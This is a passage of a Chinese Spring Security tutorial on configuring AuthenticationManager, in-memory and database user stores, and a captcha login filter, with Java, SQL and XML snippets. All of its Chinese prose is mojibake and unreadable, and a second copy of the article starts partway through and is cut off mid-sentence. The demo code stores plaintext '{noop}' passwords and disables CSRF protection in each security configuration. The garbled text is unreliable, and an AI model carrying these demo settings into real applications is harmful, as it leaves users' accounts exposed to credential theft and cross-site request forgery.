¨å±è®¤è¯ç®¡çå¨è¿æ¯å±é¨è®¤è¯ç®¡çå¨é½æ¯ç± ProviderManger è¿è¡å®ç°ã æ¯ä¸ä¸ªProviderMangerä¸­é½ä»£çä¸ä¸ªAuthenticationProviderçåè¡¨ï¼åè¡¨ä¸­æ¯ä¸ä¸ªå®ç°ä»£è¡¨ä¸ç§èº«ä»½è®¤è¯æ¹å¼ãè®¤è¯æ¶åºå±æ°æ®æºéè¦è°ç¨ UserDetailService æ¥å®ç°ã\n\n# éç½®å¨å± AuthenticationManager\n\nhttps://spring.io/guides/topicals/spring-security-architecture\n\né»è®¤çå¨å± AuthenticationManager\n\n@Configuration\npublic class WebSecurityConfigurer extends WebSecurityConfigurerAdapter {\n  @Autowired\n  public void initialize(AuthenticationManagerBuilder builder) {\n    //builder..\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n * springboot å¯¹ security è¿è¡èªå¨éç½®æ¶èªå¨å¨å·¥åä¸­åå»ºä¸ä¸ªå¨å±AuthenticationManager\n\næ»ç»\n\n 1. é»è®¤èªå¨éç½®åå»ºå¨å±AuthenticationManager é»è®¤æ¾å½åé¡¹ç®ä¸­æ¯å¦å­å¨èªå®ä¹ UserDetailService å®ä¾ èªå¨å°å½åé¡¹ç® UserDetailService å®ä¾è®¾ç½®ä¸ºæ°æ®æº\n 2. é»è®¤èªå¨éç½®åå»ºå¨å±AuthenticationManager å¨å·¥åä¸­ä½¿ç¨æ¶ç´æ¥å¨ä»£ç ä¸­æ³¨å¥å³å¯\n\nèªå®ä¹å¨å± AuthenticationManager\n\n@Configuration\npublic class WebSecurityConfigurer extends WebSecurityConfigurerAdapter {\n  @Override\n  public void configure(AuthenticationManagerBuilder builder) {\n  \t//builder ....\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\næ»ç»\n\n 1. ä¼å°å·¥åä¸­èªå¨éç½®AuthenticationManager è¿è¡è¦ç\n 2. éè¦å¨å®ç°ä¸­æå®è®¤è¯æ°æ®æºå¯¹è±¡ UserDetaiService å®ä¾\n 3. è¿ç§æ¹å¼åå»ºAuthenticationManagerå¯¹è±¡å·¥ååé¨æ¬å°ä¸ä¸ª AuthenticationManager å¯¹è±¡ ä¸åè®¸å¨å¶ä»èªå®ä¹ç»ä»¶ä¸­è¿è¡æ³¨å¥\n\nç¨æ¥å¨å·¥åä¸­æ´é²èªå®ä¹AuthenticationManager å®ä¾\n\n@Configuration\npublic class WebSecurityConfigurer extends WebSecurityConfigurerAdapter {\n  \n    //1.èªå®ä¹AuthenticationManager  æ¨è  å¹¶æ²¡æå¨å·¥åä¸­æ´é²åºæ¥\n    @Override\n    public void configure(AuthenticationManagerBuilder builder) throws Exception {\n        System.out.println("èªå®ä¹AuthenticationManager: " + builder);\n        builder.userDetailsService(userDetailsService());\n    }\n\n    //ä½ç¨: ç¨æ¥å°èªå®ä¹AuthenticationManagerå¨å·¥åä¸­è¿è¡æ´é²,å¯ä»¥å¨ä»»ä½ä½ç½®æ³¨å¥\n    @Override\n    @Bean\n    public AuthenticationManager authenticationManagerBean() throws Exception {\n        return super.authenticationManagerBean();\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# èªå®ä¹åå­æ°æ®æº\n\n@Configuration\npublic class WebSecurityConfigurer extends WebSecurityConfigurerAdapter {\n\n    @Bean\n    public UserDetailsService userDetailsService(){\n        InMemoryUserDetailsManager inMemoryUserDetailsManager\n                = new InMemoryUserDetailsManager();\n        UserDetails u1 = User.withUsername("zhangs")\n                .password("{noop}111").roles("USER").build();\n        inMemoryUserDetailsManager.createUser(u1);\n        return inMemoryUserDetailsManager;\n    }\n\n    @Override\n    protected void configure(AuthenticationManagerBuilder auth) \n      throws Exception {\n        auth.userDetailsService(userDetailsService());\n    }  \t\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n# èªå®ä¹æ°æ®åºæ°æ®æº\n\næ°æ®åºæ°æ®è¡¨è®¾è®¡\n\n-- ç¨æ·è¡¨\nCREATE TABLE `user`\n(\n    `id`                    int(11) NOT NULL AUTO_INCREMENT,\n    `username`              varchar(32)  DEFAULT NULL,\n    `password`              varchar(255) DEFAULT NULL,\n    `enabled`               tinyint(1) DEFAULT NULL,\n    `accountNonExpired`     tinyint(1) DEFAULT NULL,\n    `accountNonLocked`      tinyint(1) DEFAULT NULL,\n    `credentialsNonExpired` tinyint(1) DEFAULT NULL,\n    PRIMARY KEY (`id`)\n) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;\n-- è§è²è¡¨\nCREATE TABLE `role`\n(\n    `id`      int(11) NOT NULL AUTO_INCREMENT,\n    `name`    varchar(32) DEFAULT NULL,\n    `name_zh` varchar(32) DEFAULT NULL,\n    PRIMARY KEY (`id`)\n) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;\n-- ç¨æ·è§è²å³ç³»è¡¨\nCREATE TABLE `user_role`\n(\n    `id`  int(11) NOT NULL AUTO_INCREMENT,\n    `uid` int(11) DEFAULT NULL,\n    `rid` int(11) DEFAULT NULL,\n    PRIMARY KEY (`id`),\n    KEY   `uid` (`uid`),\n    KEY   `rid` (`rid`)\n) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8;\n\n-- æå¥ç¨æ·æ°æ®\nBEGIN;\n  INSERT INTO `user`\n  VALUES (1, \'root\', \'{noop}123\', 1, 1, 1, 1);\n  INSERT INTO `user`\n  VALUES (2, \'admin\', \'{noop}123\', 1, 1, 1, 1);\n  INSERT INTO `user`\n  VALUES (3, \'blr\', \'{noop}123\', 1, 1, 1, 1);\nCOMMIT;\n-- æå¥è§è²æ°æ®\nBEGIN;\n  INSERT INTO `role`\n  VALUES (1, \'ROLE_product\', \'ååç®¡çå\');\n  INSERT INTO `role`\n  VALUES (2, \'ROLE_admin\', \'ç³»ç»ç®¡çå\');\n  INSERT INTO `role`\n  VALUES (3, \'ROLE_user\', \'ç¨æ·ç®¡çå\');\nCOMMIT;\n-- æå¥ç¨æ·è§è²æ°æ®\nBEGIN;\n  INSERT INTO `user_role`\n  VALUES (1, 1, 1);\n  INSERT INTO `user_role`\n  VALUES (2, 1, 2);\n  INSERT INTO `user_role`\n  VALUES (3, 2, 2);\n  INSERT INTO `user_role`\n  VALUES (4, 3, 3);\nCOMMIT;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n\n\nåå»ºå¯¹åºçå®ä½ç±»å¯¹è±¡\n\npackage com.pwddd.springsecurity.entity;\n\nimport lombok.AllArgsConstructor;\nimport lombok.Data;\nimport lombok.NoArgsConstructor;\nimport org.springframework.security.core.GrantedAuthority;\nimport org.springframework.security.core.authority.SimpleGrantedAuthority;\nimport org.springframework.security.core.userdetails.UserDetails;\n\nimport java.util.ArrayList;\nimport java.util.Collection;\nimport java.util.List;\n\n@Data\n@AllArgsConstructor\n@NoArgsConstructor\npublic class User implements UserDetails {\n    private Integer id;\n    private String username;\n    private String password;\n    private Boolean enabled;\n    private Boolean accountNonExpired;\n    private Boolean accountNonLocked;\n    private Boolean credentialsNonExpired;\n    private List<Role> roles = new ArrayList<>();\n\n    @Override\n    public Collection<? extends GrantedAuthority> getAuthorities() {\n        List<GrantedAuthority> grantedAuthorities = new ArrayList<>();\n        roles.forEach(role->grantedAuthorities.add(new SimpleGrantedAuthority(role.getName())));\n        return grantedAuthorities;\n    }\n\n    @Override\n    public String getPassword() {\n        return password;\n    }\n\n    @Override\n    public String getUsername() {\n        return username;\n    }\n\n    @Override\n    public boolean isAccountNonExpired() {\n        return accountNonExpired;\n    }\n\n    @Override\n    public boolean isAccountNonLocked() {\n        return accountNonLocked;\n    }\n\n    @Override\n    public boolean isCredentialsNonExpired() {\n        return credentialsNonExpired;\n    }\n\n    @Override\n    public boolean isEnabled() {\n        return enabled;\n    }\n\t\t//get/set....\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n\n\nè§è²å¯¹è±¡\n\npackage com.pwddd.springsecurity.entity;\n\nimport lombok.*;\nimport org.springframework.context.annotation.Scope;\n\n@Data\n@AllArgsConstructor\n@NoArgsConstructor\npublic class Role {\n    private Integer id;\n    private String name;\n    private String nameZh;\n  \t//get set..\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\nåå»ºå¯¹åºçService\n\npackage com.pwddd.springsecurity.service.impl;\n\nimport com.pwddd.springsecurity.entity.User;\nimport com.pwddd.springsecurity.mapper.UserMapper;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.security.core.userdetails.UserDetails;\nimport org.springframework.security.core.userdetails.UserDetailsService;\nimport org.springframework.security.core.userdetails.UsernameNotFoundException;\nimport org.springframework.stereotype.Service;\nimport org.springframework.util.ObjectUtils;\n\n@Service\npublic class UserServiceImpl implements UserDetailsService {\n    @Autowired\n    private  UserMapper userDao;\n\n\n    @Override\n    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {\n        User user = userDao.loadUserByUsername(username);\n        if(ObjectUtils.isEmpty(user))throw new RuntimeException("ç¨æ·ä¸å­å¨");\n        user.setRoles(userDao.getRolesByUid(user.getId()));\n        return user;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\nä½¿ç¨è¯¥Service\n\n@Autowired\nprivate UserServiceImpl userService;\n\n\n\n@Override\nprotected void configure(AuthenticationManagerBuilder builder) throws Exception {\n  builder.userDetailsService(userService);\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# éªè¯ç æ¡ä¾\n\n# ä¼ ç»Webæ¡ä¾\n\n 0. åå»ºä¸ä¸ªæ°é¡¹ç®ï¼å¼å¥webç¸å³ä¾èµï¼æµè¯ç¯å¢ãå¼å¥spring securityä½¿ç¨é»è®¤æ¦æªæµè¯ã\n\n 1. èªå®ä¹SpringSecurityéç½®ã\n\n   package com.pwddd.web.conf;\n   \n   import org.springframework.context.annotation.Configuration;\n   import org.springframework.security.config.annotation.web.builders.HttpSecurity;\n   import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;\n   \n   @Configuration\n   public class SecurityConfig extends WebSecurityConfigurerAdapter {\n     @Override\n     protected void configure(HttpSecurity http) throws Exception {\n       http.authorizeRequests()\n         //                .mvcMatchers("/test").permitAll()\n         .mvcMatchers("/login").permitAll()\n         .mvcMatchers("/doLogin").permitAll()\n         .anyRequest().authenticated()\n         .and()\n         .formLogin()\n         .loginPage("/login")\n         .defaultSuccessUrl("/index")\n         .failureUrl("/login")\n         .usernameParameter("uname")\n         .passwordParameter("passwd")\n         .loginProcessingUrl("/doLogin")\n         .and().csrf().disable();\n     }\n   }\n   \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n 2. èªå®ä¹æ°æ®æº\n\n   package com.pwddd.web.service;\n   \n   import com.pwddd.web.entity.User;\n   import com.pwddd.web.mapper.UserMapper;\n   import org.springframework.beans.factory.annotation.Autowired;\n   import org.springframework.security.core.userdetails.UserDetails;\n   import org.springframework.security.core.userdetails.UserDetailsService;\n   import org.springframework.security.core.userdetails.UsernameNotFoundException;\n   import org.springframework.stereotype.Component;\n   import org.springframework.stereotype.Service;\n   \n   @Service\n   public class UserService implements UserDetailsService {\n   \n       private final UserMapper userMapper;\n   \n       public UserService(UserMapper userMapper) {\n           this.userMapper = userMapper;\n       }\n   \n       @Override\n       public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {\n           User user = userMapper.loadUserByUsername(username);\n           System.out.println(user);\n           if (user == null) throw new UsernameNotFoundException("ç¨æ·åä¸æ­£ç¡®");\n           return user;\n       }\n   }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n   package com.pwddd.web.conf;\n   \n   import com.pwddd.web.service.UserService;\n   import org.springframework.context.annotation.Configuration;\n   import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;\n   import org.springframework.security.config.annotation.web.builders.HttpSecurity;\n   import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;\n   import org.springframework.security.core.userdetails.UserDetailsService;\n   \n   @Configuration\n   public class SecurityConfig extends WebSecurityConfigurerAdapter {\n   \n       private final UserService userService;\n   \n       public SecurityConfig(UserService userService) {\n           this.userService = userService;\n       }\n   \n       @Override\n       protected UserDetailsService userDetailsService() {\n           return userService;\n       }\n   \n       @Override\n       protected void configure(AuthenticationManagerBuilder auth) throws Exception {\n           auth.userDetailsService(userDetailsService());\n       }\n   \n       @Override\n       protected void configure(HttpSecurity http) throws Exception {\n           http.authorizeRequests()\n   //                .mvcMatchers("/test").permitAll()\n                   .mvcMatchers("/login").permitAll()\n                   .mvcMatchers("/doLogin").permitAll()\n                   .anyRequest().authenticated()\n                   .and()\n                   .formLogin()\n                   .loginPage("/login")\n                   .defaultSuccessUrl("/index")\n                   .failureUrl("/login")\n                   .usernameParameter("uname")\n                   .passwordParameter("passwd")\n                   .loginProcessingUrl("/doLogin")\n                   .and().csrf().disable();\n       }\n   }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n 3. çæéªè¯ç \n\n<dependency>\n  <groupId>com.github.penggle</groupId>\n  <artifactId>kaptcha</artifactId>\n  <version>2.3.2</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\npackage com.pwddd.web.conf;\n\nimport com.google.code.kaptcha.Producer;\nimport com.google.code.kaptcha.impl.DefaultKaptcha;\nimport com.google.code.kaptcha.util.Config;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\n\nimport java.util.Properties;\n\n@Configuration\npublic class KaptchaConfig {\n\n  @Bean\n  public Producer kaptcha() {\n    Properties properties = new Properties();\n    properties.setProperty("kaptcha.image.width", "150");\n    properties.setProperty("kaptcha.image.height", "50");\n\n    properties.setProperty("kaptcha.textproducer.char.string", "0123456789");\n    properties.setProperty("kaptcha.textproducer.char.length", "4");\n    Config config = new Config(properties);\n    DefaultKaptcha defaultKaptcha = new DefaultKaptcha();\n    defaultKaptcha.setConfig(config);\n    return defaultKaptcha;\n  }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\nçæéªè¯ç \n\n@RequestMapping("/code")\npublic void verify(HttpServletResponse resp, HttpSession session) throws IOException {\n  resp.setContentType("image/png");\n  String code = producer.createText();\n  session.setAttribute("code",code);\n  BufferedImage image = producer.createImage(code);\n  ServletOutputStream outputStream = resp.getOutputStream();\n  ImageIO.write(image,"png",outputStream);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\næ·»å å°é¡µé¢\n\néªè¯ç ï¼ <input type="text" name="code"> <img th:src="@{/code}" alt="éªè¯ç " /> <br>\n\n\n1\n\n\nèªå®ä¹éªè¯ç å¼å¸¸\n\npackage com.pwddd.web.ex;\n\n\nimport org.springframework.security.core.AuthenticationException;\n\npublic class CaptchaNotMatchException extends AuthenticationException {\n  public CaptchaNotMatchException(String msg) {\n    super(msg);\n  }\n\n  public CaptchaNotMatchException(String msg, Throwable cause) {\n    super(msg, cause);\n  }\n\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\nå¤çæºå¸¦éªè¯ç çè¯·æ±ï¼èªå®ä¹filter\n\npackage com.pwddd.web.filter;\n\nimport com.pwddd.web.ex.CaptchaNotMatchException;\nimport org.springframework.security.core.Authentication;\nimport org.springframework.security.core.AuthenticationException;\nimport org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter;\nimport org.springframework.util.ObjectUtils;\n\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class CustomerFilter extends UsernamePasswordAuthenticationFilter {\n  public static final String SPRING_SECURITY_FORM_CODE_KEY = "code";\n  private String codeParameter = SPRING_SECURITY_FORM_CODE_KEY;\n\n  public String getCodeParameter() {\n    return codeParameter;\n  }\n\n  public void setCodeParameter(String codeParameter) {\n    this.codeParameter = codeParameter;\n  }\n\n  @Override\n  public Authentication attemptAuthentication(HttpServletRequest request, HttpServletResponse response) throws AuthenticationException {\n\n    String code = request.getParameter(getCodeParameter());\n    String sessionCode = (String) request.getSession().getAttribute(getCodeParameter());\n    if (!ObjectUtils.isEmpty(code)\n        && !ObjectUtils.isEmpty(sessionCode)\n        && code.equals(sessionCode)\n       ){\n      return super.attemptAuthentication(request,response);\n    }\n    throw new CaptchaNotMatchException("éªè¯ç éè¯¯");\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\næ¿æ¢æé»è®¤çUsernamePasswordAuthenticationFilter\n\npackage com.pwddd.web.config;\n\nimport com.pwddd.web.filter.ImageCodeFilter;\nimport com.pwddd.web.service.UserService;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;\nimport org.springframework.security.config.annotation.web.builders.HttpSecurity;\nimport org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;\nimport org.springframework.security.core.userdetails.UserDetailsService;\nimport org.springframework.security.web.authentication.UsernamePasswordAuthenticationFilter;\n\n@Configuration\npublic class SecurityConfig extends WebSecurityConfigurerAdapter {\n\n  private final UserService userService;\n\n  public SecurityConfig(UserService userService) {\n    this.userService = userService;\n  }\n\n  @Override\n  protected void configure(AuthenticationManagerBuilder auth) throws Exception {\n    auth.userDetailsService(userDetailsService());\n  }\n\n  @Override\n  protected UserDetailsService userDetailsService() {\n    return userService;\n  }\n\n  @Bean\n  ImageCodeFilter imageCodeFilter() throws Exception {\n    ImageCodeFilter imageCodeFilter = new ImageCodeFilter();\n    imageCodeFilter.setCodeParameter("code");\n    imageCodeFilter.setPasswordParameter("passwd");\n    imageCodeFilter.setUsernameParameter("uname");\n    imageCodeFilter.setFilterProcessesUrl("/doLogin");\n    imageCodeFilter.setAuthenticationManager(authenticationManager());\n    return imageCodeFilter;\n  }\n\n  @Override\n  protected void configure(HttpSecurity http) throws Exception {\n    http.authorizeRequests()\n      .mvcMatchers("/code").permitAll()\n      .mvcMatchers("/login").permitAll()\n      .mvcMatchers("/doLogin").permitAll()\n      .anyRequest().authenticated()\n      .and()\n      .formLogin()\n      .loginPage("/login")\n      .successForwardUrl("/index")\n      .and()\n      .csrf().disable();\n    http.addFilterAt(imageCodeFilter(), UsernamePasswordAuthenticationFilter.class);\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n\n\n# ååç«¯åç¦»æ¡ä¾\n\n 0. åå»ºååç«¯åç¦»é¡¹ç®ï¼å¼å¥ç¸å³ä¾èµï¼æµè¯ç¯å¢ã\n\n 1. èªå®ä¹æ°æ®æºãåä¸é¢çå¹¶æ²¡æä»ä¹ä¸åã\n\n 2. èªå®ä¹æåå¤çå¨åå¤±è´¥å¤çå¨ä»¥åæ æéç»å½ååºã\n\n@Configuration\npublic class SecurityConfig extends WebSecurityConfigurerAdapter {\n\n\n  private final UserService userService;\n\n  @Autowired\n  public SecurityConfig(UserService userService) {\n    this.userService = userService;\n  }\n\n  @Override\n  protected UserDetailsService userDetailsService() {\n    return userService;\n  }\n\n  @Override\n  protected void configure(HttpSecurity http) throws Exception {\n    http.authorizeRequests()\n      .anyRequest().authenticated()\n      .and()\n      .formLogin()\n      .successHandler(((request, response, authentication) -> {\n        response.setContentType("application/json;charset=utf-8");\n        HashMap<String, Object> result = new HashMap<>();\n        result.put("msg","ç»å½æåï¼");\n        result.put("code",200);\n        String resultJson = new ObjectMapper().writeValueAsString(result);\n        response.getWriter().write(resultJson);\n      }))\n      .failureHandler(((request, response, exception) -> {\n        response.setContentType("application/json;charset=utf-8");\n        HashMap<String, Object> result = new HashMap<>();\n        result.put("msg","ç»å½å¤±è´¥ï¼");\n        result.put("code",401);\n        String resultJson = new ObjectMapper().writeValueAsString(result);\n        response.getWriter().write(resultJson);\n      }))\n      .and()\n      .exceptionHandling()\n      .authenticationEntryPoint(((request, response, accessDeniedException) -> {\n        response.setContentType("application/json;charset=utf-8");\n        HashMap<String, Object> result = new HashMap<>();\n        result.put("msg","æ æéè®¿é®ï¼");\n        result.put("code",403);\n        String resultJson = new ObjectMapper().writeValueAsString(result);\n        response.getWriter().write(resultJson);\n\n      }))\n      .and().csrf().disable();\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n\n 3. èªå®ä¹éªè¯ç å¤çï¼åä¸é¢ä¸æ ·ã\n\nçæéªè¯ç å¹¶è¾åºbase64\n\n@GetMapping("code")\npublic String code(HttpSession session) throws IOException {\n  String text = producer.createText();\n  System.out.println(text);\n  session.setAttribute(new ImageCodeFilter().getCodeParameter(),text);\n  BufferedImage image = producer.createImage(text);\n  ByteArrayOutputStream bos = new ByteArrayOutputStream();\n  ImageIO.write(image,"png",bos);\n  return Base64.encodeBase64String(bos.toByteArray());\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n@Configuration\npublic class SecurityConfig extends WebSecurityConfigurerAdapter {\n\nâ¦â¦â¦â¦\n  @Bean\n  public ImageCodeFilter imageCodeFilter() throws Exception {\n    ImageCodeFilter imageCodeFilter = new ImageCodeFilter();\n    imageCodeFilter.setCodeParameter("code");\n    imageCodeFilter.setUsernameParameter("uname");\n    imageCodeFilter.setPasswordParameter("passwd");\n    imageCodeFilter.setAuthenticationManager(authenticationManager());\n    return imageCodeFilter;\n  }\n\n\n  @Override\n  protected void configure(HttpSecurity http) throws Exception {\n    http.authorizeRequests()\n      .mvcMatchers("/code").permitAll()\n\n      â¦â¦â¦â¦\n    http.addFilterAt(imageCodeFilter(), UsernamePasswordAuthenticationFilter.class);\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n\n# å¯ç å å¯\n\n\n# rememberMe\n\n\n# ä¼è¯ç®¡ç\n\n\n# CSRF',normalizedContent:'# spring security\n\n> spring securityæ¯ä¸ä¸ªåè½å¼ºå¤§ãå¯é«åº¦å®å¶çèº«ä»½éªè¯åè®¿é®æ§å¶çæ¡æ¶ãæèè¯´ç¨æ¥å®ç°ç³»ç»ä¸­æéç®¡ççæ¡æ¶ã\n\n\n# æ¦è¿°\n\n\n# æéç®¡ç\n\nåºæ¬ä¸æ¶åå°ç¨æ·åä¸çç³»ç»é½è¦è¿è¡æéç®¡çï¼æéç®¡çå±äºç³»ç»å®å¨çèç´ï¼æéç®¡çå®ç°å¯¹ç¨æ·è®¿é®ç³»ç»çæ§å¶ï¼æç§å®å¨è§åæèå®å¨ç­ç¥æ§å¶ç¨æ·å¯ä»¥è®¿é®èä¸åªè½è®¿é®èªå·±è¢«ææçèµæºã\n\næéç®¡çåæ¬ç¨æ·èº«ä»½è®¤è¯åææä¸¤é¨åï¼ç®ç§°è®¤è¯ææãå¯¹äºéè¦è®¿é®æ§å¶çèµæºç¨æ·é¦åç»è¿èº«ä»½è®¤è¯ï¼è®¤è¯éè¿åç¨æ·å·æè¯¥èµæºçè®¿é®æéæ¹å¯è®¿é®ã\n\n# è®¤è¯\n\nèº«ä»½è®¤è¯ï¼å°±æ¯å¤æ­ä¸ä¸ªç¨æ·æ¯å¦ä¸ºåæ³ç¨æ·çå¤çè¿ç¨ãæå¸¸ç¨çç®åèº«ä»½è®¤è¯æ¹å¼æ¯ç³»ç»éè¿æ ¸å¯¹ç¨æ·è¾å¥çç¨æ·ååå£ä»¤ï¼çå¶æ¯å¦ä¸ç³»ç»ä¸­å­å¨çè¯¥ç¨æ·çç¨æ·ååå£ä»¤ä¸è´ï¼æ¥å¤æ­ç¨æ·èº«ä»½æ¯å¦æ­£ç¡®ãå¯¹äºéç¨æçº¹ç­ç³»ç»ï¼ååºç¤ºæçº¹ï¼å¯¹äºç¡¬ä»¶keyç­å·å¡ç³»ç»ï¼åéè¦å·å¡ã\n\n# ææ\n\nææï¼å³è®¿é®æ§å¶ï¼æ§å¶è°è½è®¿é®åªäºèµæºãä¸»ä½è¿è¡èº«ä»½è®¤è¯åéè¦åéæéæ¹å¯è®¿é®ç³»ç»çèµæºï¼å¯¹äºæäºèµæºæ²¡ææéæ¯æ æ³è®¿é®çã\n\n# å¸¸è§è§£å³æ¹æ¡\n\n * shiro\n   * shiro æ¬èº«æ¯ä¸ä¸ªèççå®å¨ç®¡çæ¡æ¶ï¼æçä¼å¤çä¼ç¹ï¼ä¾å¦è½»éãç®åãæäºéæãå¯ä»¥å¨javaseç¯å¢ä¸­ä½¿ç¨ç­ãä¸è¿ï¼å¨å¾®æå¡æ¶ä»£ï¼shiro å°±æ¾å¾åä¸ä»å¿äºï¼å¨å¾®æå¡é¢ååæ©å±æ¹é¢ï¼æ æ³ååå±ç¤ºèªå·±çä¼å¿ã\n * å¼åèèªå®ä¹\n   * ä¹æå¾å¤å¬å¸éæ©èªå®ä¹æéï¼å³èªå·±å¼åæéç®¡çãä½æ¯ä¸ä¸ªç³»ç»çå®å¨ï¼ä¸ä»ä»æ¯ç»å½åæéæ§å¶è¿ä¹ç®åï¼æä»¬è¿è¦èèç§åæ ·å¯è½å­å¨çç½ç»æ¿å»ä»¥åé²å½»ç­ç¥ï¼ä»è¿ä¸ªè§åº¦æ¥è¯´ï¼å¼åèç½å·±å®ç°å®å¨ç®¡çä¹å¹¶éæ¯ä¸ä»¶å®¹æçäºæï¼åªæå¤§å¬å¸ææè¶³å¤çäººåç©åå»æ¯æè¿ä»¶äºæã\n * spring security\n   * spring security,ä½ä¸ºspring å®¶æçä¸åï¼å¨å spring å®¶æçå¶ä»æåå¦ spring boot spring clondç­è¿è¡æ´åæ¶ï¼å·æå¶ä»æ¡æ¶æ å¯æ¯æçä¼å¿ï¼åæ¶å¯¹ oauth2 æçè¯å¥½çæ¯æï¼åå ä¸spring cloudå¯¹ spring securityçä¸æ­å æï¼å¦æ¨åº spring cloud security )ï¼è®© spring securiy ä¸ç¥ä¸è§ä¸­æä¸ºå¾®æå¡é¡¹ç®çé¦éå®å¨ç®¡çæ¹æ¡ã\n\n\n# ç®ä»\n\nspring securityæ¯ä¸ä¸ªåè½å¼ºå¤§ãå¯é«åº¦å®å¶çèº«ä»½éªè¯åè®¿é®æ§å¶æ¡æ¶ãå®æ¯ä¿æ¤åºäºspringçåºç¨ç¨åºçäºå®æ åã\n\nspring securityæ¯ä¸ä¸ªé¢åjavaåºç¨ç¨åºæä¾èº«ä»½éªè¯åå®å¨æ§çæ¡æ¶ãä¸ææspringé¡¹ç®ä¸æ ·ï¼spring securityççæ­£å¨åå¨äºå®å¯ä»¥è½»æ¾å°æ©å±ä»¥æ»¡è¶³å®å¶éæ±ã\n\n\n# åå²\n\nspring security ææ©å« acegi securityï¼ è¿ä¸ªåç§°å¹¶ä¸æ¯è¯´å®å spring å°±æ²¡æå³ç³»ï¼å®ä¾ç¶æ¯ä¸ºspring æ¡æ¶æä¾å®å¨æ¯æçãacegi security åºäº springï¼å¯ä»¥å¸®å©æä»¬ä¸ºé¡¹ç®å»ºç«ä¸°å¯çè§è²ä¸æéç®¡çç³»ç»ãacegi security è½ç¶å¥½ç¨ï¼ä½æ¯æä¸ºäººè¯ççåæ¯å®èè¿ç¦ççéç½®è¿ä¸é®é¢æç»ä¹éä¼ ç»äº spring securityã\n\nacegi security æç»è¢«å¹¶å¥ spring security é¡¹ç®ä¸­ï¼å¹¶äº 2008 